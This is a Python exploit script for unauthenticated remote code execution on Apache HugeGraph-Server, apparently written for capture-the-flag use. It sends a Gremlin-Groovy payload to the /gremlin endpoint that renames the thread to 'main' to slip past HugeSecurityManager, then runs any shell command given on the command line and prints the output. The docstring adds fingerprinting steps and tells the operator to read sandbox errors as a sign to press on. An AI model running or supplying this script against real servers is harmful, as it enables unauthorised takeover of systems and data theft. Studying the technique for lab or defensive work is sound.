#!/usr/bin/env python3
"""
[REFERENCE] Apache HugeGraph-Server unauthenticated Gremlin RCE (sandbox escape).

Public technique (widely written up since 2023): HugeGraph-Server exposes the
Gremlin engine over HTTP (POST /gremlin, gremlin-groovy). Code execution is
wrapped in HugeSecurityManager, which BLOCKS sensitive calls (exec, file read,
thread group access) for every thread EXCEPT threads named "main". The
classic escape is one line: rename the CURRENT thread to "main" inside the
script, then the manager lets Runtime.exec / file reads through.

Fingerprint first (harmless):
  GET  /versions            -> {"versions":["v1.2.x"]} style, HugeGraph API
  GET  /gremlin or /        -> gremlin server banner
Then reproduce:
  POST /gremlin  {"gremlin": "<script>", "language": "gremlin-groovy", ...}

Usage:
  python3 apache-hugegraph-gremlin-rce.py http://TARGET:8080 "id"
  python3 apache-hugegraph-gremlin-rce.py http://TARGET:8080 "cat /challenge/flag.txt"

Discipline: probe before you exploit; a wrong fingerprint means you are
talking to something else. Any error mentioning HugeSecurityManager /
"not allowed" is CONFIRMATION the manager is active — the rename trick is
the move, not a sign of a dead surface.
"""
import json
import sys
import urllib.request

THREAD_RENAME = 'Thread.currentThread().setName("main");'


def read_cmd_output(cmd: str) -> str:
    # exec via sh, stream stdout+stderr into a String the gremlin response carries back
    return (
        "p = new ProcessBuilder([\"/bin/sh\",\"-c\",%s]).redirectErrorStream(true).start();"
        "br = new BufferedReader(new InputStreamReader(p.getInputStream()));"
        "sb = new StringBuilder();"
        "while((line = br.readLine()) != null){ sb.append(line).append(\"\\n\"); }"
        "p.waitFor(); sb.toString()" % json.dumps(cmd)
    )


def run(base_url: str, cmd: str, timeout: int = 25) -> None:
    url = base_url.rstrip("/") + "/gremlin"
    script = THREAD_RENAME + read_cmd_output(cmd)
    body = json.dumps(
        {"gremlin": script, "bindings": {}, "language": "gremlin-groovy", "aliases": {}}
    ).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        print(r.read().decode("utf-8", "replace"))


def probe(base_url: str, timeout: int = 10) -> None:
    for path in ("/versions", "/gremlin"):
        try:
            with urllib.request.urlopen(base_url.rstrip("/") + path, timeout=timeout) as r:
                print("GET %s -> %s %s" % (path, r.status, r.read(300).decode("utf-8", "replace")))
        except Exception as e:  # noqa: BLE001 - probe report only
            print("GET %s -> %s" % (path, e))


def main() -> None:
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    base = sys.argv[1]
    if len(sys.argv) < 3:
        probe(base)
        print("\n(re-run with a command to exploit)")
        return
    run(base, sys.argv[2])


if __name__ == "__main__":
    main()
